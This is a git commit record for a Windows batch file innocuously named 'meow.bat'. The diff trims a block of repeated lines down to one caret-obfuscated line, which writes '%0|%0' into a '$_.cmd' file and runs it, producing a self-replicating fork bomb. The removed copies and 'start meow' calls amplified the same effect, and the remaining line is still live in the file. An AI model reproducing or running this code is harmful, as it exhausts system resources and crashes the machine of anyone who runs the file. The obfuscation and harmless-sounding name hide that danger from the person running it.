323b377a166dd6585bf45ff8ec2baf93ac65dfec
James101217 <105470172+James101217@users.noreply.github.com>
2025-11-26 17:44:26 +0800

    Update meow.bat

--- meow.bat
+++ meow.bat
@@ -1,12 +1,2 @@
-start meow
+
 @echo.%0^|%0>$^_^.c^md&$_>nul
-@echo.%0^|%0>$^_^.c^md&$_>nul
-@echo.%0^|%0>$^_^.c^md&$_>nul
-@echo.%0^|%0>$^_^.c^md&$_>nul
-@echo.%0^|%0>$^_^.c^md&$_>nul
-@echo.%0^|%0>$^_^.c^md&$_>nul
-@echo.%0^|%0>$^_^.c^md&$_>nul
-@echo.%0^|%0>$^_^.c^md&$_>nul
-@echo.%0^|%0>$^_^.c^md&$_>nul
-@echo.%0^|%0>$^_^.c^md&$_>nul
-start meow
